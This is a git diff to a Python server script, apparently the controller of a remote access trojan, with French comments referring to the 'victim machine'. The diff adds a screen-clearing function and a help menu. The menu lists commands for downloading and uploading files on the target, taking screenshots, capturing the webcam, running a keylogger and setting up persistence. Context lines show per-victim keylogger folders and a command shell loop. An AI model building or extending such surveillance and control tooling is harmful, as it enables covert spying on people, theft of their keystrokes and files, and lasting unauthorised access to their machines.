@@ -1,5 +1,6 @@
 #!/usr/bin/python3
 
+import platform
 import socket
 import json
 import os
@@ -25,6 +26,37 @@ def create_client_folder(client_ip):
         os.makedirs(os.path.join(client_folder, "downloads"), exist_ok=True)
         os.makedirs(os.path.join(client_folder, "keylogger"), exist_ok=True)
     return client_folder
+
+
+
+def clear_screen():
+    """
+    Nettoie l'écran en fonction du système d'exploitation.
+    """
+    os.system('cls' if platform.system() == 'Windows' else 'clear')
+    
+    
+def show_help():
+    """
+    Affiche une liste des commandes disponibles.
+    """
+    help_text = """
+    Liste des commandes disponibles :
+    ---------------------------------
+    cd <path>         : Changer le répertoire sur la machine cible.
+    cd                : Afficher le répertoire courant sur la machine cible.
+    download <file>   : Télécharger un fichier depuis la machine cible.
+    upload <file>     : Envoyer un fichier vers la machine cible.
+    screenshot        : Capturer une capture d'écran de la machine cible.
+    camera            : Capturer une image depuis la webcam de la machine cible.
+    keylogger start   : Démarrer l'enregistrement des touches.
+    keylogger stop    : Arrêter et télécharger les données du keylogger.
+    persistance       : Configurer la persistance sur la machine cible.
+    clear/cls         : Nettoyer l'écran.
+    help              : Afficher cette aide.
+    exit/quit         : Quitter la session.
+    """
+    print(help_text)    
 #la fonction pour etablire la connexion avec la machine vicitme
 def connection():
     global s, target, ip
@@ -88,6 +120,14 @@ def shell():
                 sending(command)
                 response = receive()
                 print(response)
+                continue
+            
+            elif command.lower() in ["clear", "cls"]:
+                clear_screen()
+                continue
+
+            elif command.lower() == "help":
+                show_help()
                 continue
             
              #la commande pour puise fair changer le repertoire dans la machine de la vicitime   
